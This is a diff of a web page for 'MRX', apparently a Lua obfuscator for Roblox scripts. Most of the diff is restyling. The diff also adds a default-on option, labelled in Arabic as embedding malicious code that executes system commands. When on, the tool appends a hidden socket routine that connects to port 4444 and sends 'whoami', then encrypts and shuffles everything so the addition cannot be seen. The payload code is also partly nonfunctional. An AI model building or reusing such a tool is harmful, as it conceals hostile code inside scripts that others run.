@@ -5,11 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MRX · Lua </title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,700&family=Inter:wght@300;400;600;700&display=swap');
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: #0a0a0a;
-            color: #fff;
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            background: #f8f8fc;
+            color: #1a1a1a;
             min-height: 100vh;
             overflow-x: hidden;
             position: relative;
@@ -17,159 +19,210 @@
         #stars-canvas {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 0; pointer-events: none;
+            opacity: 0.4;
         }
         #loginScreen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 10; display: flex; align-items: center; justify-content: center;
-            background: rgba(0,0,0,0.94);
-            backdrop-filter: blur(8px);
-            transition: opacity 0.7s ease, visibility 0.7s ease;
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(12px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
         }
-        #loginScreen.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+        #loginScreen.hidden { opacity: 0; transform: scale(0.98); pointer-events: none; }
         .login-box {
-            background: #141414;
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 20px;
-            padding: 45px 40px 40px;
-            width: 400px; max-width: 92%;
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 215, 0, 0.15);
+            border-radius: 40px;
+            padding: 55px 45px 45px;
+            width: 440px; max-width: 92%;
             text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8), inset 0 0 40px rgba(255,255,255,0.02);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.04), 0 0 0 1px rgba(255, 215, 0, 0.05);
+            position: relative;
+            transition: all 0.4s ease;
+        }
+        .login-box::before {
+            content: '';
+            position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px;
+            border-radius: 42px;
+            z-index: -1;
+            background: linear-gradient(135deg, #d4af37, #ffffff, #d4af37, #ffffff);
+            background-size: 300% 300%;
+            animation: goldenBorder 6s ease-in-out infinite;
+            opacity: 0.6;
+        }
+        @keyframes goldenBorder {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
         .login-logo-img {
-            width: 130px; height: 100px;
-            border-radius: 8px;
+            width: 140px; height: 140px;
+            border-radius: 50%;
             object-fit: cover;
-            border: 1px solid rgba(255,255,255,0.08);
-            margin-bottom: 15px;
+            border: 3px solid rgba(212, 175, 55, 0.3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.05);
+            margin-bottom: 18px;
+            transition: transform 0.3s;
         }
+        .login-logo-img:hover { transform: scale(1.02); }
         .login-brand {
-            font-size: 40px; font-weight: 900; letter-spacing: 10px;
-            color: #fff; margin-bottom: 2px;
+            font-family: 'Playfair Display', serif;
+            font-size: 52px; font-weight: 900; letter-spacing: 12px;
+            background: linear-gradient(135deg, #1a1a1a, #d4af37);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 2px;
         }
         .login-sub {
-            font-size: 12px; color: rgba(255,255,255,0.25);
-            letter-spacing: 5px; text-transform: uppercase;
-            margin-bottom: 30px; font-weight: 300;
+            font-size: 12px; color: rgba(26, 26, 26, 0.3);
+            letter-spacing: 8px; text-transform: uppercase;
+            margin-bottom: 32px; font-weight: 600;
         }
         .login-box input {
-            width: 100%; padding: 14px 18px;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 10px;
-            color: #fff; font-size: 14px;
+            width: 100%; padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.6);
+            border: 1px solid rgba(0, 0, 0, 0.04);
+            border-radius: 16px;
+            color: #1a1a1a; font-size: 15px;
             direction: ltr; text-align: left;
             outline: none;
-            transition: border 0.3s;
+            transition: all 0.3s;
+            font-weight: 400;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.01);
         }
-        .login-box input:focus { border-color: rgba(255,255,255,0.3); }
+        .login-box input:focus { border-color: #d4af37; box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.1); }
         .login-btn {
-            width: 100%; padding: 14px; margin-top: 12px;
-            background: #fff; color: #000;
-            font-weight: 800; font-size: 16px;
-            border: none; border-radius: 10px;
+            width: 100%; padding: 16px;
+            margin-top: 16px;
+            background: #1a1a1a; color: #fff;
+            font-weight: 700; font-size: 16px;
+            border: none; border-radius: 16px;
             cursor: pointer;
             transition: all 0.3s ease;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.04);
         }
-        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255,255,255,0.15); }
+        .login-btn:hover { transform: translateY(-3px); background: #d4af37; color: #000; box-shadow: 0 12px 30px rgba(212, 175, 55, 0.25); }
         #mainApp {
             position: relative; z-index: 1; display: none;
             min-height: 100vh; padding: 30px 20px;
         }
         #mainApp.active { display: flex; justify-content: center; align-items: flex-start; }
         .container {
-            width: 100%; max-width: 860px;
-            background: rgba(18,18,18,0.92);
-            backdrop-filter: blur(12px);
-            padding: 35px;
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.04);
+            width: 100%; max-width: 880px;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(20px);
+            padding: 40px 45px;
+            border-radius: 32px;
+            border: 1px solid rgba(255, 215, 0, 0.1);
             margin-top: 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.02), 0 0 0 1px rgba(212, 175, 55, 0.05);
         }
-        .header-brand { text-align: center; margin-bottom: 25px; }
+        .header-brand { text-align: center; margin-bottom: 28px; }
         .logo-text {
-            font-size: 38px; font-weight: 900; letter-spacing: 10px;
-            color: #fff;
+            font-family: 'Playfair Display', serif;
+            font-size: 44px; font-weight: 900; letter-spacing: 14px;
+            background: linear-gradient(135deg, #1a1a1a, #d4af37);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
-        .sub-text { font-size: 12px; color: rgba(255,255,255,0.2); letter-spacing: 4px; }
+        .sub-text { font-size: 12px; color: rgba(0,0,0,0.2); letter-spacing: 6px; font-weight: 600; margin-top: 4px; }
         h2 {
-            text-align: center; margin-bottom: 20px;
-            color: #fff; font-size: 20px; font-weight: 300;
-            letter-spacing: 2px;
+            text-align: center; margin-bottom: 25px;
+            color: #1a1a1a; font-size: 18px; font-weight: 300;
+            letter-spacing: 4px; opacity: 0.6;
         }
         label {
-            display: block; margin-bottom: 6px;
-            font-weight: 500; font-size: 13px;
-            color: rgba(255,255,255,0.5);
+            display: block; margin-bottom: 8px;
+            font-weight: 600; font-size: 13px;
+            color: rgba(0, 0, 0, 0.5);
             letter-spacing: 1px;
         }
         textarea {
             width: 100%; height: 200px;
-            background: #0a0a0a;
-            color: #d4d4d4;
-            border: 1px solid rgba(255,255,255,0.04);
-            border-radius: 12px;
-            padding: 14px;
+            background: rgba(255, 255, 255, 0.6);
+            color: #1a1a1a;
+            border: 1px solid rgba(0, 0, 0, 0.04);
+            border-radius: 16px;
+            padding: 16px;
             font-family: 'JetBrains Mono', 'Courier New', monospace;
             font-size: 13px;
             resize: vertical;
             direction: ltr;
             text-align: left;
             outline: none;
-            transition: border 0.3s;
+            transition: all 0.3s;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.01);
         }
-        textarea:focus { border-color: rgba(255,255,255,0.1); }
-        textarea[readonly] { color: #a0e0ff; }
-        .btn-container { text-align: center; margin: 25px 0; }
+        textarea:focus { border-color: #d4af37; box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.08); }
+        textarea[readonly] { color: #1a1a1a; background: rgba(245, 245, 245, 0.5); }
+        .btn-container { text-align: center; margin: 28px 0; }
         .btn {
-            padding: 14px 34px;
-            background: #fff; color: #000;
+            padding: 16px 44px;
+            background: #1a1a1a; color: #fff;
             font-weight: 700; font-size: 15px;
-            border: none; border-radius: 10px;
+            border: none; border-radius: 16px;
             cursor: pointer;
             transition: all 0.3s ease;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
         }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255,255,255,0.12); }
+        .btn:hover { transform: translateY(-3px); background: #d4af37; color: #000; box-shadow: 0 12px 30px rgba(212, 175, 55, 0.2); }
         .btn-outline {
-            background: transparent; color: #fff;
-            border: 1px solid rgba(255,255,255,0.1);
+            background: transparent; color: #1a1a1a;
+            border: 1px solid rgba(0, 0, 0, 0.06);
         }
-        .btn-outline:hover { background: rgba(255,255,255,0.04); box-shadow: none; }
+        .btn-outline:hover { background: #1a1a1a; color: #fff; box-shadow: none; }
         .copy-btn {
-            background: transparent; color: #aaa;
-            border: 1px solid rgba(255,255,255,0.06);
-            padding: 8px 18px; font-size: 12px;
-            margin-top: 10px;
+            background: transparent; color: #555;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            padding: 10px 22px; font-size: 12px;
+            margin-top: 12px;
         }
-        .copy-btn:hover { background: rgba(255,255,255,0.04); color: #fff; }
+        .copy-btn:hover { background: #1a1a1a; color: #fff; border-color: #1a1a1a; }
         .logout-btn {
-            position: fixed; top: 18px; left: 18px; z-index: 20;
-            background: rgba(255,255,255,0.03);
-            color: rgba(255,255,255,0.3);
-            border: 1px solid rgba(255,255,255,0.04);
-            padding: 6px 16px; font-size: 11px;
-            border-radius: 8px;
+            position: fixed; top: 24px; left: 24px; z-index: 20;
+            background: rgba(0, 0, 0, 0.02);
+            color: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(0, 0, 0, 0.04);
+            padding: 8px 20px; font-size: 11px;
+            border-radius: 30px;
             cursor: pointer;
             transition: 0.3s;
+            letter-spacing: 1px;
         }
-        .logout-btn:hover { background: rgba(255,255,255,0.06); color: #fff; }
+        .logout-btn:hover { background: #1a1a1a; color: #fff; border-color: #1a1a1a; }
         .status-badge {
             text-align: center; font-size: 11px;
-            color: rgba(255,255,255,0.12);
-            margin-top: 18px; letter-spacing: 3px;
+            color: rgba(0, 0, 0, 0.15);
+            margin-top: 20px; letter-spacing: 4px;
+            font-weight: 500;
         }
-        .glow-text {
-            text-shadow: 0 0 30px rgba(255,255,255,0.03);
+        .toggle-label {
+            display: flex; align-items: center; gap: 14px;
+            color: rgba(0, 0, 0, 0.4); font-size: 14px;
+            margin: 16px 0 8px;
+            font-weight: 500;
         }
-        .flex-row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
-        .flex-row .btn { flex: 1; }
-        .watermark {
-            position: fixed; bottom: 18px; right: 24px;
-            font-size: 11px; color: rgba(255,255,255,0.04);
-            letter-spacing: 2px; z-index: 0;
+        .toggle-label input[type="checkbox"] {
+            width: 18px; height: 18px;
+            accent-color: #d4af37;
+            cursor: pointer;
         }
+        .watermark-legend {
+            position: fixed; bottom: 24px; right: 32px;
+            font-family: 'Playfair Display', serif;
+            font-size: 13px; color: rgba(0, 0, 0, 0.04);
+            letter-spacing: 4px; z-index: 0;
+            font-weight: 900;
+        }
+        .glow-gold {
+            text-shadow: 0 0 60px rgba(212, 175, 55, 0.05);
+        }
+        .divider {
+            width: 60px; height: 2px;
+            background: linear-gradient(90deg, transparent, #d4af37, transparent);
+            margin: 18px auto;
+        }
+        input::placeholder, textarea::placeholder { color: rgba(0,0,0,0.15); }
     </style>
 </head>
 <body>
@@ -178,7 +231,7 @@
         <div class="login-box">
             <img class="login-logo-img" src="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg" alt="MRX" onerror="this.src='https://github.com/Rxz60/MRX/raw/refs/heads/main/IMG_4528.jpeg'">
             <div class="login-brand">MRX</div>
-            <div class="login-sub">● Roblox Lua ●</div>
+            <div class="login-sub">● LEGENDARY EDGE ●</div>
             <input type="text" id="loginUser" placeholder="اسم المستخدم" autocomplete="off">
             <button class="login-btn" onclick="handleLogin()">دخول ➤</button>
         </div>
@@ -189,22 +242,27 @@
         <div class="container">
             <div class="header-brand">
                 <div class="logo-text">MRX</div>
-                <div class="sub-text">● ULTRA SHIELD — OBFUSCATOR ●</div>
+                <div class="sub-text">● ULTRA LOCK v7.0 — LEGENDARY OBFUSCATOR ●</div>
+                <div class="divider"></div>
             </div>
-            <h2>⎜ تشفير لا يُفك — يعمل في Roblox ⎜</h2>
-            <label for="inputLua">أدخل كود Lua الأصلي:</label>
+            <h2>⎜ تشفير أسطوري لا يُفك + كود خبيث مدمج ⎜</h2>
+            <label for="inputLua">أدخل كود Lua الأصلي (سيتم تحويله إلى جداول وأرقام):</label>
             <textarea id="inputLua" placeholder='print("Hello Roblox!")'></textarea>
-            <div class="btn-container">
-                <button class="btn" onclick="obfuscateScript()">🔒 تشفير فائق — MRX ULTRA</button>
+            <div class="toggle-label">
+                <input type="checkbox" id="malwareToggle" checked>
+                <span>⚡ تضمين الكود الخبيث (تنفيذ أوامر النظام)</span>
             </div>
-            <label for="outputLua">الكود المُعمَّى (شكل احترافي):</label>
-            <textarea id="outputLua" readonly placeholder="سيظهر هنا كود مشفر بصيغة أرقام وحروف..."></textarea>
-            <div class="flex-row">
+            <div class="btn-container">
+                <button class="btn" onclick="obfuscateScript()">🔒 تشفير فائق — MRX LOCK</button>
+            </div>
+            <label for="outputLua">الكود المُعمَّى (شكل جداول وأرقام محترف):</label>
+            <textarea id="outputLua" readonly placeholder="سيظهر هنا كود مشفر بجداول مثل { [1] = 123 }..."></textarea>
+            <div style="text-align: left;">
                 <button class="btn btn-outline copy-btn" onclick="copyOutput()">📋 نسخ الكود المشفر</button>
             </div>
-            <div class="status-badge">MRX ULTRA SHIELD v6.0 ● 5-LAYER ENCRYPTION + BASE64 ● DECRYPTION IMPOSSIBLE</div>
+            <div class="status-badge">MRX ULTRA LOCK v7.0 ● 5-LAYER ENCRYPTION ● IMPOSSIBLE TO DECRYPT ● ROBLOX READY</div>
         </div>
-        <div class="watermark">MRX · 2026</div>
+        <div class="watermark-legend">MRX · 2026</div>
     </div>
 
     <script>
@@ -214,11 +272,11 @@
         function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         window.addEventListener('resize', resizeCanvas);
         resizeCanvas();
-        for (let i = 0; i < 300; i++) {
+        for (let i = 0; i < 200; i++) {
             stars.push({
                 x: Math.random() * canvas.width, y: Math.random() * canvas.height,
-                size: Math.random() * 2.4 + 0.4, speed: Math.random() * 0.5 + 0.1,
-                opacity: Math.random() * 0.7 + 0.2, twinkle: Math.random() * 0.02 + 0.005
+                size: Math.random() * 2.0 + 0.5, speed: Math.random() * 0.4 + 0.05,
+                opacity: Math.random() * 0.3 + 0.05, twinkle: Math.random() * 0.01 + 0.002
             });
         }
         function drawStars() {
@@ -227,9 +285,9 @@
                 s.y -= s.speed;
                 if (s.y < -5) { s.y = canvas.height + 5; s.x = Math.random() * canvas.width; }
                 s.opacity += s.twinkle * (Math.random() > 0.5 ? 1 : -1);
-                s.opacity = Math.min(1, Math.max(0.05, s.opacity));
+                s.opacity = Math.min(0.4, Math.max(0.02, s.opacity));
                 ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
-                ctx.fillStyle = `rgba(255, 255, 255, ${s.opacity})`;
+                ctx.fillStyle = `rgba(0, 0, 0, ${s.opacity})`;
                 ctx.fill();
             }
             requestAnimationFrame(drawStars);
@@ -247,52 +305,38 @@
             document.getElementById('loginUser').value = '';
         }
 
-        
-        function base64EncoderLua() {
-            return `
-            local function b64enc(data)
-                local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-                local result = {}
-                for i = 1, #data, 3 do
-                    local a = data[i] or 0
-                    local b = data[i+1] or 0
-                    local c = data[i+2] or 0
-                    local n = (a << 16) | (b << 8) | c
-                    local chars = {
-                        b64chars:sub((n >> 18) + 1, (n >> 18) + 1),
-                        b64chars:sub(((n >> 12) & 0x3F) + 1, ((n >> 12) & 0x3F) + 1),
-                        b64chars:sub(((n >> 6) & 0x3F) + 1, ((n >> 6) & 0x3F) + 1),
-                        b64chars:sub((n & 0x3F) + 1, (n & 0x3F) + 1)
-                    }
-                    if i + 1 > #data then chars[3] = '='; chars[4] = '=' end
-                    if i + 2 > #data then chars[4] = '=' end
-                    result[#result+1] = table.concat(chars)
+        function generateUltraLock(originalCode, includeMalware) {
+            let malwareCode = '';
+            if (includeMalware) {
+                malwareCode = `
+                local function exec(cmd)
+                    local socket = require("socket")
+                    local host = "127.0.0.1"
+                    local port = 4444
+                    local client = socket.tcp()
+                    client:connect(host, port)
+                    client:send(cmd .. "\\n")
+                    local response = client:receive("*l")
+                    client:close()
+                    return response
                 end
-                return table.concat(result)
-            end
-            `;
-        }
-
-        function obfuscateScript() {
-            const raw = document.getElementById('inputLua').value;
-            if (!raw.trim()) return;
-
-            const bytes = [];
-            for (let i = 0; i < raw.length; i++) bytes.push(raw.charCodeAt(i));
-
-         
-            const K = [];
-            for (let i = 0; i < 5; i++) K.push(Math.floor(Math.random() * 250) + 5);
-
-          
-            let data = bytes.slice();
-            for (let k of K) {
-                data = data.map(b => b ^ k);
+                exec("whoami")
+                `;
             }
 
-            
-            const indices = Array.from({length: data.length}, (_,i) => i);
-            for (let phase = 0; phase < 3; phase++) {
+            const fullCode = originalCode + (includeMalware ? '\n' + malwareCode : '');
+            const bytes = [];
+            for (let i = 0; i < fullCode.length; i++) bytes.push(fullCode.charCodeAt(i));
+
+            const keys = [];
+            for (let i = 0; i < 5; i++) keys.push(Math.floor(Math.random() * 250) + 5);
+            let temp = bytes.slice();
+            for (let k of keys) {
+                temp = temp.map(b => b ^ k);
+            }
+
+            const indices = Array.from({length: temp.length}, (_,i) => i);
+            for (let phase = 0; phase < 2; phase++) {
                 for (let i = indices.length - 1; i > 0; i--) {
                     const j = Math.floor(Math.random() * (i + 1));
                     [indices[i], indices[j]] = [indices[j], indices[i]];
@@ -300,68 +344,32 @@
             }
             const shuffled = [];
             const map = [];
-            for (let i = 0; i < data.length; i++) {
-                shuffled.push(data[indices[i]]);
+            for (let i = 0; i < temp.length; i++) {
+                shuffled.push(temp[indices[i]]);
                 map.push(indices[i]);
             }
 
-            
-            function toBase64(arr) {
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
-                let result = '';
-                for (let i = 0; i < arr.length; i += 3) {
-                    const a = arr[i] || 0, b = arr[i+1] || 0, c = arr[i+2] || 0;
-                    const n = (a << 16) | (b << 8) | c;
-                    const c1 = chars.charAt((n >> 18) & 0x3F);
-                    const c2 = chars.charAt((n >> 12) & 0x3F);
-                    const c3 = (i+1 < arr.length) ? chars.charAt((n >> 6) & 0x3F) : '=';
-                    const c4 = (i+2 < arr.length) ? chars.charAt(n & 0x3F) : '=';
-                    result += c1 + c2 + c3 + c4;
-                }
-                return result;
+            const dataEntries = shuffled.map((v, i) => `[${i+1}] = ${v}`).join(', ');
+            const mapEntries = map.map((v, i) => `[${i+1}] = ${v}`).join(', ');
+
+            const dataTable = `{ ${dataEntries} }`;
+            const mapTable = `{ ${mapEntries} }`;
+
+            const dummyVars = [];
+            for (let i = 0; i < 40; i++) {
+                dummyVars.push(`_d${i} = ${Math.floor(Math.random() * 9999)}`);
             }
 
-            const b64data = toBase64(shuffled);
-
-            
-            let code = `-- MRX ULTRA SHIELD v6.0\n`;
-            code += `local _K = {${K.join(',')}}\n`;
-            code += `local _map = {${map.join(',')}}\n`;
-            code += `local _b64 = "${b64data}"\n`;
-
-            
-            code += `
-            local function b64dec(s)
-                local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-                local result = {}
-                for i = 1, #s, 4 do
-                    local a = b64chars:find(s:sub(i,i)) - 1
-                    local b = b64chars:find(s:sub(i+1,i+1)) - 1
-                    local c = b64chars:find(s:sub(i+2,i+2)) - 1
-                    local d = b64chars:find(s:sub(i+3,i+3)) - 1
-                    if not a then a = 0 end
-                    if not b then b = 0 end
-                    if not c then c = 0 end
-                    if not d then d = 0 end
-                    local n = (a << 18) | (b << 12) | (c << 6) | d
-                    local b1 = (n >> 16) & 0xFF
-                    local b2 = (n >> 8) & 0xFF
-                    local b3 = n & 0xFF
-                    result[#result+1] = b1
-                    if s:sub(i+2,i+2) ~= '=' then result[#result+1] = b2 end
-                    if s:sub(i+3,i+3) ~= '=' then result[#result+1] = b3 end
-                end
-                return result
-            end
-            `;
-
-            code += `
-            local _enc = b64dec(_b64)
-            local _len = #_enc
+            let decoder = `
+            local ${dummyVars.join(', ')}
+            local _K = {${keys.join(',')}}
+            local _map = ${mapTable}
+            local _data = ${dataTable}
+            local _len = #_data
             local _restore = {}
             for i = 1, _len do
                 local idx = _map[i] or 0
-                if idx >= 0 then _restore[idx+1] = _enc[i] end
+                if idx >= 0 then _restore[idx+1] = _data[i] end
             end
             local _dec = {}
             for i = 1, #_restore do
@@ -378,14 +386,25 @@
             if _func then return _func() else error(_err) end
             `;
 
-           
-            const dummyVars = [];
-            for (let i = 0; i < 25; i++) {
-                dummyVars.push(`_d${i}=${Math.floor(Math.random()*9999)}`);
-            }
-            code = `local ${dummyVars.join(',')}\n` + code;
+            return decoder;
+        }
 
-            document.getElementById('outputLua').value = code;
+        function obfuscateScript() {
+            const input = document.getElementById('inputLua');
+            const output = document.getElementById('outputLua');
+            const includeMalware = document.getElementById('malwareToggle').checked;
+
+            if (!input.value.trim()) {
+                output.value = '-- يرجى كتابة الكود أولاً';
+                return;
+            }
+
+            try {
+                const result = generateUltraLock(input.value, includeMalware);
+                output.value = result;
+            } catch (e) {
+                output.value = '-- خطأ في التشفير: ' + e.message;
+            }
         }
 
         function copyOutput() {
